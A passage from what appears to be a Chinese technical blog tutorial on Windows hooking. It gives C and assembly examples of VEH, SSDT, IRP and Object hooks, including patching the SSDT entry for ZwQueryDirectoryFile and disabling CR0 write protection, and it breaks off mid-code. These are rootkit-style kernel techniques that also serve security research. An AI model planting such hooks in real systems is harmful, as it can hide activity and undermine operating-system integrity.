class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为X64是采用了类似于FastCall的调用约定，所以压栈顺序为RCX,RDX,R8,R9。同时也是从右到左的传参方式。所以，修改RDX就可以修改MsgBox的第二个参数。<strong>同时，别忘记修改Eip到TrampolineFun</strong>。对于x86平台下的，只需要修改栈顶第二个参数就可以了。<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">|<span class="type">|#ifdef</span> _WIN64</div><div class="line">pContextRecord-&gt;Rdx = (ULONG_PTR)szText;</div><div class="line">pContextRecord-&gt;Rip = g_OriginalMessageBoxA;</div><div class="line">|<span class="type">|#else</span></div><div class="line">/*</div><div class="line"><span class="number">0012</span>FF70   <span class="number">0040105</span>A   /CALL 到 MessageBoxA 来自 VEHHook<span class="number">.00401054</span></div><div class="line"><span class="number">0012</span>FF74   <span class="number">00000000</span>   |<span class="type">hOwner</span> = NULL</div><div class="line"><span class="number">0012</span>FF78   <span class="number">00407030</span>   |<span class="type">Text</span> = <span class="string">"VEH Hook"</span></div><div class="line"><span class="number">0012</span>FF7C   <span class="number">0040703</span>C   |<span class="type">Title</span> = <span class="string">"Test"</span></div><div class="line"><span class="number">0012</span>FF80   <span class="number">00000000</span>   \Style = MB_OK|<span class="type">MB_APPLMODAL</span></div><div class="line"><span class="number">0012</span>FF84   <span class="number">00401225</span>   返回到 VEHHook.&lt;ModuleEntryPoint&gt;+<span class="number">0</span>B4 来自 VEHHook<span class="number">.00401000</span></div><div class="line">*/</div><div class="line">ULONG_PTR* uEsp = (ULONG_PTR*)pContextRecord-&gt;Esp;   //截断栈</div><div class="line">uEsp[<span class="number">2</span>] = (ULONG_PTR)szText;</div><div class="line">pContextRecord-&gt;Eip = (ULONG_PTR)g_OriginalMessageBoxA; //跳过函数开头</div><div class="line">|<span class="type">|#endif</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置异常，这里选择的是简单的断点异常。直接将Target原始代码修改一个字节为0xCC即可！<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">g_OldCode[<span class="number">0</span>] = *pTarget;</div><div class="line"><span class="keyword">if</span> (!VirtualProtect(pTarget, <span class="keyword">sizeof</span>(BYTE), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"VirtualProtect:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="comment">//修改CC</span></div><div class="line">pTarget[<span class="number">0</span>] = <span class="number">0xCC</span>;</div><div class="line"><span class="keyword">if</span> (!VirtualProtect(pTarget, <span class="keyword">sizeof</span>(BYTE), dwOldProtect, &amp;dwOldProtect))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"VirtualProtect:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="0x4-SSDT-HOOK"><a href="#0x4-SSDT-HOOK" class="headerlink" title="0x4 SSDT_HOOK"></a>0x4 SSDT_HOOK</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSDT中文全称为<strong>系统服务描述符表</strong>，其作用是作为R3和R0层的通道，将用户态API函数和内核函数联系起来。用简单的API函数举例子，我们调用了CreateFile,其会调用ZwCreateFile,然后调用NtCreateFile，经过参数和模式的检查，然后调用系统服务分发函数KiSystemService进入内核。在R0中通过传入的系统服务号(函数索引)得到系统服务的地址，然后调用该系统服务即可。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以，根据上述，我们可以知道SSDT其实是一个存储系统服务的数组。SSDT_HOOK其实就是在内核层的AddressHook。只不过他修改是系统服务描述符表数据。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为SSDT的索引号和系统服务内核地址是一一对应的，所以不需要向普通的AddressHook一一对比函数地址。所以让我们来屡一下执行SSDT的操作。我们有目的向原因开始。如果我们需要执行SSDT_HOOK的话，首先需要修改为与SSDT中的系统服务地址，但又由于系统服务地址是和服务索引是保持对应关系的，所以我们还需要获取索引号。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上面的分析，我们知道首先需要获取服务索引号。但是服务索引号和函数地址对应的，<strong>在X86系统中，相对于导出函数偏移量1的地址往后读四个字节就是SSDT服务索引号。但是对于X64位的系统，却是函数地址偏移为4的地址读取四个字节。</strong>所以需要得到服务索引号，就需要得到导出函数地址。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们现在总结一下得到服务索引的步骤：</p><ul><li>Step1：将Ntdll.dll载入内存</li><li>Step2：获取导出函数地址</li><li>Step3：计算函数索引</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSDT适用于R0内，在内核层映射文件到内存和在应用层是一致的。只是使用的函数不一样,首先使用<code>InitializeObjectAttributes</code>初始化文件对象，然后使用<code>ZwOpenFile</code>获得映射文件句柄,接着使用<code>ZwCreateSection</code>创建创建一个节对象。最后使用<code>ZwMapViewOfSection</code>,这些都是固定的模板，代码如下。<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">//初始化文件对象</div><div class="line">InitializeObjectAttributes(&amp;objectAttributes,</div><div class="line">&amp;ustrDllFileName,</div><div class="line">OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, </div><div class="line">NULL, NULL);</div><div class="line">//获得映射文件句柄</div><div class="line"><span class="built_in">status</span> = ZwOpenFile(&amp;hFile,</div><div class="line">GENERIC_READ,</div><div class="line">&amp;objectAttributes, </div><div class="line">&amp;iosb, </div><div class="line">FILE_SHARE_READ,</div><div class="line">FILE_SYNCHRONOUS_IO_NONALERT);</div><div class="line"><span class="keyword">if</span> (!NT_SUCCESS(<span class="built_in">status</span>))</div><div class="line">&#123;</div><div class="line">//DbgPrint宏定义</div><div class="line">KdPrint((<span class="string">"ZwOpenFile Error! [error code: 0x%X]"</span>, <span class="built_in">status</span>));</div><div class="line"><span class="keyword">return</span> <span class="built_in">status</span>;</div><div class="line">&#125;</div><div class="line">//创建一个节对象</div><div class="line"><span class="built_in">status</span> = ZwCreateSection(&amp;hSection, SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, <span class="number">0</span>, PAGE_READWRITE, <span class="number">0x100000</span>, hFile);</div><div class="line"><span class="keyword">if</span> (!NT_SUCCESS(<span class="built_in">status</span>))</div><div class="line">&#123;</div><div class="line">//DbgPrint宏定义</div><div class="line">ZwClose(hFile);</div><div class="line">KdPrint((<span class="string">"ZwCreateSection Error! [error code: 0x%X]"</span>, <span class="built_in">status</span>));</div><div class="line"><span class="keyword">return</span> <span class="built_in">status</span>;</div><div class="line">&#125;</div><div class="line">//将文件映射到内存</div><div class="line"><span class="built_in">status</span> = ZwMapViewOfSection(hSection, GetCurrentProcess(), &amp;pBaseAddress, <span class="number">0</span>, <span class="number">1024</span>,<span class="number">0</span>, &amp;viewSize,ViewShare, MEM_TOP_DOWN, PAGE_READWRITE);</div><div class="line"><span class="keyword">if</span> (!NT_SUCCESS(<span class="built_in">status</span>))</div><div class="line">&#123;</div><div class="line">//DbgPrint宏定义</div><div class="line">ZwClose(hFile);</div><div class="line">ZwClose(hSection);</div><div class="line">KdPrint((<span class="string">"ZwMapViewOfSection Error! [error code: 0x%X]"</span>, <span class="built_in">status</span>));</div><div class="line"><span class="keyword">return</span> <span class="built_in">status</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将Ntdll映射到内存中，然后就想普通的获取导出函数地址的方式获取对应的函数地址，然后根据公式获取服务索引。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ULONG</span> GetIndexFromExportTable(PVOID pBaseAddress, PCHAR pszFunctionName)</div><div class="line">&#123;</div><div class="line"><span class="keyword">ULONG</span> ulFunctionIndex = <span class="number">0</span>;</div><div class="line"><span class="comment">// Dos Header</span></div><div class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBaseAddress;</div><div class="line"><span class="comment">// NT Header</span></div><div class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)pDosHeader + pDosHeader-&gt;e_lfanew);</div><div class="line"><span class="comment">// Export Table</span></div><div class="line">PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress);</div><div class="line"><span class="comment">// 有名称的导出函数个数</span></div><div class="line"><span class="keyword">ULONG</span> ulNumberOfNames = pExportTable-&gt;NumberOfNames;</div><div class="line"><span class="comment">// 导出函数名称地址表</span></div><div class="line">PULONG lpNameArray = (PULONG)((PUCHAR)pDosHeader + pExportTable-&gt;AddressOfNames);</div><div class="line">PCHAR lpName = <span class="keyword">NULL</span>;</div><div class="line"><span class="comment">// 开始遍历导出表</span></div><div class="line"><span class="keyword">for</span> (<span class="keyword">ULONG</span> i = <span class="number">0</span>; i &lt; ulNumberOfNames; i++)</div><div class="line">&#123;</div><div class="line">lpName = (PCHAR)((PUCHAR)pDosHeader + lpNameArray[i]);</div><div class="line"><span class="comment">// 判断是否查找的函数</span></div><div class="line"><span class="keyword">if</span> (<span class="number">0</span> == _strnicmp(pszFunctionName, lpName, strlen(pszFunctionName)))</div><div class="line">&#123;</div><div class="line"><span class="comment">// 获取导出函数地址</span></div><div class="line">USHORT uHint = *(USHORT *)((PUCHAR)pDosHeader + pExportTable-&gt;AddressOfNameOrdinals + <span class="number">2</span> * i);</div><div class="line"><span class="keyword">ULONG</span> ulFuncAddr = *(PULONG)((PUCHAR)pDosHeader + pExportTable-&gt;AddressOfFunctions + <span class="number">4</span> * uHint);</div><div class="line">PVOID lpFuncAddr = (PVOID)((PUCHAR)pDosHeader + ulFuncAddr);</div><div class="line"><span class="comment">// 获取 SSDT 函数 Index</span></div><div class="line">|<span class="comment">#ifdef _WIN64</span></div><div class="line">ulFunctionIndex = *(<span class="keyword">ULONG</span> *)((PUCHAR)lpFuncAddr + <span class="number">4</span>);</div><div class="line">|<span class="comment">#else</span></div><div class="line">ulFunctionIndex = *(<span class="keyword">ULONG</span> *)((PUCHAR)lpFuncAddr + <span class="number">1</span>);</div><div class="line">|<span class="comment">#endif</span></div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> ulFunctionIndex;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为SSDT在x86系统上是由Ntoskrnl.exe导出，导出符号为KeServiceDesriptorTable，我们很容易获取SSDT的地址。只需要获取KeServiceDesriptorTable即可！也就是使用以下语句，同时给出_SERVICE_DESCIPTOR_TABLE结构，可以看到结构体第一个成员是SSDT基址，所以可以使用<code>(PVOID)KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex];</code>获取函数基地址。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> SSDTEntry __declspec(dllimport) KeServiceDescriptorTable;</div><div class="line"><span class="comment">//_SERVICE_DESCIPTOR_TABLE结构</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SERVICE_DESCIPTOR_TABLE</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">PULONG ServiceTableBase;  <span class="comment">// SSDT基址</span></div><div class="line">PULONG ServiceCounterTableBase;   <span class="comment">// SSDT中服务被调用次数计数器</span></div><div class="line">ULONG NumberOfService;            <span class="comment">// SSDT服务个数</span></div><div class="line">PUCHAR ParamTableBase;      <span class="comment">// 系统服务参数表基址</span></div><div class="line">&#125;SSDTEntry, *PSSDTEntry;</div><div class="line"><span class="comment">//获取服务地址</span></div><div class="line">pFunctionAddress = (PVOID)KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex];</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们已经找到了目标函数在SSDT的地址，最后，我们只需要在该地址处填写我们构造的函数地址即可！！但是这块内存是有保护属性的，所以我们需要使用MDL方式绕过写保护属性。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 使用 MDL 方式修改 SSDT</span></div><div class="line">pMdl = MmCreateMdl(<span class="keyword">NULL</span>, &amp;KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex], sizeof(<span class="keyword">ULONG</span>));</div><div class="line"><span class="keyword">if</span> (<span class="keyword">NULL</span> == pMdl)</div><div class="line">&#123;</div><div class="line">DbgPrint(<span class="string">"MmCreateMdl Error!\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line">MmBuildMdlForNonPagedPool(pMdl);</div><div class="line">pNewAddress = MmMapLockedPages(pMdl, KernelMode);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">NULL</span> == pNewAddress)</div><div class="line">&#123;</div><div class="line">IoFreeMdl(pMdl);</div><div class="line">DbgPrint(<span class="string">"MmMapLockedPages Error!\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 写入新函数地址</span></div><div class="line">ulNewFuncAddr = (<span class="keyword">ULONG</span>)New_ZwQueryDirectoryFile;</div><div class="line">RtlCopyMemory(pNewAddress, &amp;ulNewFuncAddr, sizeof(<span class="keyword">ULONG</span>));</div><div class="line"><span class="comment">// 释放</span></div><div class="line">MmUnmapLockedPages(pNewAddress, pMdl);</div><div class="line">IoFreeMdl(pMdl);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样的，卸载HOOK，只需要将之前的修改恢复就可以了<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOLEAN</span> SSDTUnhook()</div><div class="line">&#123;</div><div class="line">UNICODE_STRING ustrDllFileName;</div><div class="line"><span class="keyword">ULONG</span> ulSSDTFunctionIndex = <span class="number">0</span>;</div><div class="line">PVOID pSSDTFunctionAddress = <span class="keyword">NULL</span>;</div><div class="line">PMDL pMdl = <span class="keyword">NULL</span>;</div><div class="line">PVOID pNewAddress = <span class="keyword">NULL</span>;</div><div class="line"><span class="keyword">ULONG</span> ulOldFuncAddr = <span class="number">0</span>;</div><div class="line">RtlInitUnicodeString(&amp;ustrDllFileName, L<span class="string">"\\??\\C:\\Windows\\System32\\ntdll.dll"</span>);</div><div class="line"><span class="comment">// 从 ntdll.dll 中获取 SSDT 函数索引号</span></div><div class="line">ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, <span class="string">"ZwQueryDirectoryFile"</span>);</div><div class="line"><span class="comment">// 使用 MDL 方式修改 SSDT</span></div><div class="line">pMdl = MmCreateMdl(<span class="keyword">NULL</span>, &amp;KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex], sizeof(<span class="keyword">ULONG</span>));</div><div class="line"><span class="keyword">if</span> (<span class="keyword">NULL</span> == pMdl)</div><div class="line">&#123;</div><div class="line">DbgPrint(<span class="string">"MmCreateMdl Error!\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line">MmBuildMdlForNonPagedPool(pMdl);</div><div class="line">pNewAddress = MmMapLockedPages(pMdl, KernelMode);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">NULL</span> == pNewAddress)</div><div class="line">&#123;</div><div class="line">IoFreeMdl(pMdl);</div><div class="line">DbgPrint(<span class="string">"MmMapLockedPages Error!\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 写入原函数地址</span></div><div class="line">ulOldFuncAddr = (<span class="keyword">ULONG</span>)g_pOldSSDTFunctionAddress;</div><div class="line">RtlCopyMemory(pNewAddress, &amp;ulOldFuncAddr, sizeof(<span class="keyword">ULONG</span>));</div><div class="line"><span class="comment">// 释放</span></div><div class="line">MmUnmapLockedPages(pNewAddress, pMdl);</div><div class="line">IoFreeMdl(pMdl);</div><div class="line"><span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="0x5-IRP-Hook"><a href="#0x5-IRP-Hook" class="headerlink" title="0x5 IRP_Hook"></a>0x5 IRP_Hook</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IRP全称是IO请求包，发送到设备驱动程序的大多数请求都打包在IRP中。操作系统组件或驱动程序通过调用IoCallDriver将IRP发送给驱动程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大概的执行流程是这样的：IO管理器创建一个IRP来代表一个IO操作，并且将该IRP传递给正确的驱动程序，当此IO操作完成时再处理该请求包。相对的，驱动程序(上层的虚拟设备驱动或者底层的真实设备驱动)接收一个IRP，执行该IRP指定的操作，然后将IRP传回给IO管理器，告诉它，该操作已经完成，或者应该传给另一个驱动以进行进一步处理。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IO管理器可以使用一下三个函数创建IRP。<strong>但此时，IRP堆栈还没有被初始化，难以进行拦截。</strong>然后使用你可以调用IoGetNextIrpStackLocation函数获得该IRP第一个堆栈单元的指针。然后初始化这个堆栈单元。当初始化完成之后，就可以调用IoCallDriver函数把IRP发送到设备驱动程序了。<strong>这就可以在中途进行拦截啦。</strong></p><ul><li><code>IoBuildAsynchronousFsdRequest 创建异步IRP</code></li><li><code>IoBuildSynchronousFsdRequest 创建同步IRP</code></li><li><code>IoBuildDeviceIoControlRequest 创建一个同步IRP_MJ_DEVICE_CONTROL或IRP_MJ_INTERNAL_DEVICE_CONTROL请求。</code></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述流程，执行IrpHook可以在三个地址进行，第一：在Irp初始化之后，第二：在发往派遣例程过程中，第三，直接修改需要拦截驱动对象派遣例程函数表。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过查看 IofCallDriver函数发现，在函数开头存在一个jmp指令。<code>ff2500c85480</code>其中ff25是jmp的机器码，后面的机器码是跳转的绝对地址。可以使用InlineHook直接修改跳转地址即可<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">void HookpIofCallDriver()</div><div class="line">&#123;</div><div class="line">KIRQL oldIrql<span class="comment">;</span></div><div class="line">ULONG addr = (ULONG)IofCallDriver<span class="comment">;</span></div><div class="line">//保存原始的IofCallDriver函数地址</div><div class="line">__asm</div><div class="line">&#123;</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, addr</div><div class="line"><span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">eax</span> + <span class="number">2</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">esi</span>]</div><div class="line"><span class="keyword">mov</span> old_piofcalldriver, <span class="built_in">eax</span></div><div class="line">&#125;</div><div class="line">//引发硬件优先IRQL</div><div class="line">oldIrql = KeRaiseIrqlToDpcLevel()<span class="comment">;</span></div><div class="line">__asm</div><div class="line">&#123;</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="built_in">cr0</span></div><div class="line"><span class="keyword">mov</span> oData, <span class="built_in">eax</span></div><div class="line"><span class="keyword">and</span> <span class="built_in">eax</span>, <span class="number">0xffffffff</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cr0</span>, <span class="built_in">eax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, addr<span class="comment">; IofCallDriver</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">eax</span> + <span class="number">2</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span>[<span class="built_in">esi</span>], offset NewpIofCallDriver<span class="comment">; 写入新的数据</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, oData<span class="comment">;恢复cr0的数据</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cr0</span>, <span class="built_in">eax</span></div><div class="line">&#125;</div><div class="line">KeLowerIrql(oldIrql)<span class="comment">;</span></div><div class="line">return<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><ul><li>本文作者：<ul><li><a href="https://www.cnblogs.com/LittleHann/p/3450436.html" target="_blank" rel="external">https://www.cnblogs.com/LittleHann/p/3450436.html</a></li><li><a href="https://bbs.pediy.com/thread-60022.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-60022.htm</a></li></ul></li></ul><h1 id="0x6-Object-Hook"><a href="#0x6-Object-Hook" class="headerlink" title="0x6 Object Hook"></a>0x6 Object Hook</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先讲解一个重要的结构体<code>_OBJECT_HEADER</code>,使用WINDBG用<code>dt _OBJECT_HEADER</code>命令即可显示如下：<br>    <img src="http://hacky.wang/blog/20190515/fUeMbC0WtqpB.png?imageslim" alt="mark">  </p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">typedef <span class="class"><span class="keyword">struct</span> <span class="title">_OBJECT_HEADER</span> &#123; </span></div><div class="line">  LONG PointerCount; </div><div class="line">  <span class="class"><span class="keyword">union</span> &#123; </span></div><div class="line">    LONG HandleCount; </div><div class="line">    PSINGLE_LIST_ENTRY SEntry; </div><div class="line">  &#125;; </div><div class="line">  POBJECT_TYPE Type; <span class="regexp">//</span>这个很重要HOOK就靠它，对象类型结构也是一个对象，TYPE它是系统第一个创建出来的对象类型 </div><div class="line">  UCHAR NameInfoOffset; <span class="regexp">//</span>OBJECT_HEADER_NAME_INFO 偏移</div><div class="line">  UCHAR HandleInfoOffset; <span class="regexp">//</span>OBJECT_HEADER_HANDLE_INFO 偏移</div><div class="line">  UCHAR QuotaInfoOffset; </div><div class="line">  UCHAR Flags; </div><div class="line">  <span class="class"><span class="keyword">union</span> </span></div><div class="line">  &#123; </div><div class="line">    POBJECT_CREATE_INFORMATION ObjectCreateInfo; </div><div class="line">    PVOID QuotaBlockCharged; </div><div class="line">  &#125;;</div><div class="line">  PSECURITY_DESCRIPTOR SecurityDescriptor; </div><div class="line">  QUAD Body;<span class="regexp">//</span>对象本身 </div><div class="line">&#125; OBJECT_HEADER, *POBJECT_HEADER;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着，我们来看一下OBJECT_TYPE，同样的使用windbg<code>dt _OBJECT_TYPE</code>即可查看<br>     <img src="http://hacky.wang/blog/20190515/mzRhPtvTOhvn.png?imageslim" alt="mark"><br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">//对象类型结构</div><div class="line">typedef struct _OBJECT_TYPE &#123; </div><div class="line">  <span class="type">ERESOURCE</span> <span class="type">Mutex</span>; </div><div class="line">  <span class="type">LIST_ENTRY</span> <span class="type">TypeList</span>; //队列</div><div class="line">  <span class="type">UNICODE_STRING</span> <span class="type">Name</span>; </div><div class="line">  <span class="type">PVOID</span> <span class="type">DefaultObject</span>; </div><div class="line">  <span class="type">ULONG</span> <span class="type">Index</span>; </div><div class="line">  <span class="type">ULONG</span> <span class="type">TotalNumberOfObjects</span>; </div><div class="line">  <span class="type">ULONG</span> <span class="type">TotalNumberOfHandles</span>; </div><div class="line">  <span class="type">ULONG</span> <span class="type">HighWaterNumberOfObjects</span>; </div><div class="line">  <span class="type">ULONG</span> <span class="type">HighWaterNumberOfHandles</span>; </div><div class="line">  <span class="type">OBJECT_TYPE_INITIALIZER</span> <span class="type">TypeInfo</span>; //这个很重要，下面讲这个结构</div><div class="line">||#ifdef <span class="type">POOL_TAGGING</span> </div><div class="line">  <span class="type">ULONG</span> <span class="type">Key</span>; </div><div class="line">||#endif </div><div class="line">&#125; <span class="type">OBJECT_TYPE</span>, *<span 